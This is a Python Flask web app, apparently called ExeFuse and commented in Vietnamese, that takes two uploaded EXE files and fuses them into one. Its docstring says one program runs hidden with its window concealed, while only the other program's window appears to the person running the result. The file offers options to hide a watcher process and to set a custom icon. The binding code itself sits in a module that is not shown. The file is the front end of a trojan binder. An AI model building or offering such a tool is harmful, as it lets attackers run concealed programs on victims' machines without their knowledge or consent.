# -*- coding: utf-8 -*-
"""
ExeFuse - Web UI gop 2 file EXE thanh 1 file duy nhat.

Mot app chay NGAM (an cua so), mot app HIEN giao dien.
Khi file output duoc chay, chi xuat hien duy nhat cua so cua app chinh.

Chay server:  python app.py   ->   http://127.0.0.1:5000
"""

import os
import platform
import shutil
import tempfile
import uuid

from flask import Flask, abort, jsonify, render_template, request, send_file

from builder import build as builder

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 2 * 1024 * 1024 * 1024  # 2 GB

WORK_ROOT = os.path.join(tempfile.gettempdir(), "exefuse_jobs")
os.makedirs(WORK_ROOT, exist_ok=True)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/env")
def api_env():
    """Thong tin moi truong build (Python, PyInstaller)."""
    return jsonify({
        "python": platform.python_version(),
        "platform": platform.platform(),
        "pyinstaller": builder.pyinstaller_version(),
        "ready": builder.pyinstaller_available(),
    })


@app.route("/api/build", methods=["POST"])
def api_build():
    """Nhan 2 file EXE (1 an, 1 hien) + tuy chon, tra ve job_id de polling."""
    hidden = request.files.get("hidden_file")
    visible = request.files.get("visible_file")

    if hidden is None or not hidden.filename or visible is None or not visible.filename:
        return jsonify({"error": "Vui lòng chọn đủ 2 file EXE."}), 400

    for f in (hidden, visible):
        if not f.filename.lower().endswith(".exe"):
            return jsonify({"error": "File '%s' không phải là file .exe" % f.filename}), 400

    icon = request.files.get("icon_file")
    if icon is not None and icon.filename and not icon.filename.lower().endswith(".ico"):
        return jsonify({"error": "Icon phải là file .ico"}), 400

    output_name = request.form.get("output_name") or "ExeFuse_App"
    kill_hidden = request.form.get("kill_hidden", "0") == "1"
    hide_watch = request.form.get("hide_watch", "0") == "1"

    workdir = os.path.join(WORK_ROOT, uuid.uuid4().hex)
    os.makedirs(workdir, exist_ok=True)

    try:
        hidden_path = os.path.join(workdir, "upload_hidden.exe")
        visible_path = os.path.join(workdir, "upload_visible.exe")
        hidden.save(hidden_path)
        visible.save(visible_path)

        icon_path = None
        if icon is not None and icon.filename:
            icon_path = os.path.join(workdir, "app.ico")
            icon.save(icon_path)

        job_id = builder.start_job(
            workdir, hidden_path, visible_path, output_name,
            kill_hidden=kill_hidden, hide_watch=hide_watch, icon_src=icon_path,
        )
    except Exception as exc:
        shutil.rmtree(workdir, ignore_errors=True)
        return jsonify({"error": str(exc)}), 500

    return jsonify({"job_id": job_id})


@app.route("/api/status/<job_id>")
def api_status(job_id):
    """Trang thai + log cua job build (de UI polling)."""
    job = builder.get_job(job_id)
    if job is None:
        return jsonify({"error": "Job không tồn tại"}), 404
    return jsonify(job)


@app.route("/api/download/<job_id>")
def api_download(job_id):
    """Tai file EXE ket qua."""
    info = builder.get_result(job_id)
    if info is None:
        abort(404)
    path, name = info
    return send_file(path, as_attachment=True, download_name=name)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    print("=" * 56)
    print("  ExeFuse is running at:  http://127.0.0.1:%d" % port)
    print("  Nhan Ctrl+C de tat server.")
    print("=" * 56)
    app.run(host="127.0.0.1", port=port, debug=False, threaded=True)
